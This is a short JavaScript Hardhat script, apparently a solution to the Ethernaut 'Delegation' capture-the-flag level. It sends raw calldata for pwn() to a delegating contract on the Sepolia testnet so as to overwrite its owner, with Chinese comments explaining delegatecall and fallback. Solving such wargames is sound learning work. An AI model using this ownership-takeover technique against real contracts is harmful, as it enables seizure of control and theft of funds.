//这一关的目标是申明你对你创建实例的所有权.
// 仔细看solidity文档关于 delegatecall 的低级函数, 他怎么运行的, 他如何将操作委托给链上库, 以及他对执行的影响.
//     Fallback 方法
// 方法 ID
const {ethers} = require('hardhat');
require('dotenv').config();
const Delegation_Json = require("../artifacts/contracts/Delegation.sol/Delegation.json");
const Delegation_ABI = Delegation_Json.abi;

const Delegation_Address = '0x6319B657F585a8f7A13892137aa247597c26aeF2';


const PRIVATE_KEY = process.env.PRIVATE_KEY;
const SECOND_PRIVATE_KEY = process.env.SECOND_PRIVATE_KEY;
const ALCHEMY_SEPOLIA_URL = process.env.ALCHEMY_SEPOLIA_URL;

const provider = new ethers.providers.JsonRpcProvider(ALCHEMY_SEPOLIA_URL);
const wallet1 = new ethers.Wallet(PRIVATE_KEY, provider);
const wallet2 = new ethers.Wallet(SECOND_PRIVATE_KEY, provider);

const main = async () => {
    const Delegation = new ethers.Contract(Delegation_Address, Delegation_ABI, wallet1);
    const owner = await Delegation.owner();
    console.log('owner is:', owner);

    const abi = ["function pwn() external"];
    const interface = new ethers.utils.Interface(abi);
    const callData = interface.encodeFunctionData(`pwn`, []);
    const tx = {
        to: Delegation_Address,
        data: callData,
        gasLimit: 39328,
    }
    const receipt = await wallet1.sendTransaction(tx);
    await receipt.wait(1);
    const newowner = await Delegation.owner();
    console.log('newowner is:', newowner);
}


main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });